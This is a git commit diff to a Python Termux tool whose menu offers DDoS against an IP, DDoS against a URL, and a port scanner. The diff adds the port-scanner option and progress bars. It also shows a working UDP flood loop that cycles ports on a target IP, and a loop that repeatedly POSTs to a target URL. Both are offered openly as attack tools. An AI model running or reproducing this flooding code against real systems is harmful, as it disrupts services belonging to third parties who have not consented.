5538b2bf9ab027ab68edb6ff2360c0987455308c
ryugenxd <anonimous7770@gmail.com>
2022-10-13 13:10:13 +0800

    update

--- Run.py
+++ Run.py
@@ -2,7 +2,8 @@
 
 from os import system as bash
 from sys import exit as keluar
-from bin import Rio
+from bin import Rio,DarkHunt
+
 try :
   from requests import get as deteksiIp
   from rich.console import Console
@@ -26,13 +27,22 @@ def pilih():
     URL = input("\nURL TARGET : ")
     AMOUNT = int(input("AMOUNT TARGET: "))
     Rio.AttackUrl(URL,AMOUNT)
+  elif pilih_menu in ['03','3']:
+    IP = input("\nIP : ")
+    DarkHunt.portScanner(IP)
   elif pilih_menu in ['0','00']:
+    bash('rm  $HOME/.termux/colors.properties')
+    bash('rm  $HOME/.termux/font.ttf')
+    bash('termux-reload-settings')
     exit('\nまたね !')
   else:
     print('\033[1;31mpilih yang ada di menu !\033[0m');
 def hapus():
   bash('clear')
 def main():
+  bash('cp colors.properties $HOME/.termux/')
+  bash('cp font.ttf $HOME/.termux/')
+  bash('termux-reload-settings')
   re = deteksiIp('https://api.myip.com').json()
   ip = re['ip']
   table = Table(title="my ip: %s"%(ip))
@@ -45,9 +55,9 @@ def main():
   """
   # ada jepang 🤭🤣
   table.add_column(logo, style="cyan", no_wrap=False)
-  table.add_row("[1]. DDOS IP  [3]. PORT SCANNER")
-  table.add_row("[2]. DDOS URL")
-  table.add_row("[0]. EXIT")
+  table.add_row("1. DDOS IP  3. PORT SCANNER")
+  table.add_row("2. DDOS URL")
+  table.add_row("0. EXIT")
   console = Console()
   hapus()
   console.print(table)
--- bin/Rio.py
+++ bin/Rio.py
@@ -4,7 +4,7 @@ import time
 import socket
 import random
 import requests
-
+from rich.progress import track
 
 
 from datetime import datetime
@@ -42,28 +42,26 @@ data = {
   }
 
 def AttackIp(ip,port):
-  print("[                ] 0% ")
-  #time.sleep(5)
-  print("[====            ] 25% ")
-  #time.sleep(5)
-  print("[========        ] 50% ")
- # time.sleep(5)
-  print("[==========      ] 75% ")
-  #time.sleep(5)
-  print("[================] 100% ")
+  for i in track(range(3), description="start up ..."):
+    time.sleep(1) 
   sent = 0
-  while True:
-    sock.sendto(bytes,(ip,port))
-    sent = sent + 1
-    port = port + 1
-    print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
-    if port == 65534:
-       port = 1
+  try:
+    while True:
+      sock.sendto(bytes,(ip,port))
+      sent = sent + 1
+      port = port + 1
+      print("Sent \033[1;32m%s\033[0m packet to \033[1;33m%s\033[0m throught \033[1;33mport:%s\033[0m"%(sent,ip,port))
+      if port == 65534:
+         port = 1
+  except KeyboardInterrupt:
+    exit('\n\033[1;33mプログラムを終了します !\033[0m')
+  except socket.gaierror:
+    exit('\n\033[1;33m the ip you entered is wrong !\033[0m')
 
 
 def AttackUrl(url,amount=False):
   if amount == False:
     amount = 100
-  for i in range(1,int(amount)):
+  for i in track(range(1,int(amount)),description='attack process '):
     req = requests.post(url,data=data,headers=h)
     print("Send {}, respon {}".format(i,req.status_code))
